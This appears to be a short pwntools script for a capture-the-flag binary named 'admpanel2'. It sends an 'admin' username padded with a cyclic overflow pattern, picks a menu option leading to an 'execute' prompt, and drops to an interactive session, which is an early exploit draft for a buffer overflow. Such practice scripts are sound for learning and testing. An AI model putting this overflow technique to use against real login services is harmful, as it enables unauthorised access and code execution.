from pwn import *

p=process('./admpanel2')
pause()
elf=ELF('./admpanel2')

p.sendlineafter('>','1')
p.sendlineafter('username:','admin'+cyclic(0x100-0x10))
p.sendlineafter('password:','password')
p.sendlineafter('>','2')
# p.sendlineafter('execute:',cyclic(0x300))
p.interactive()
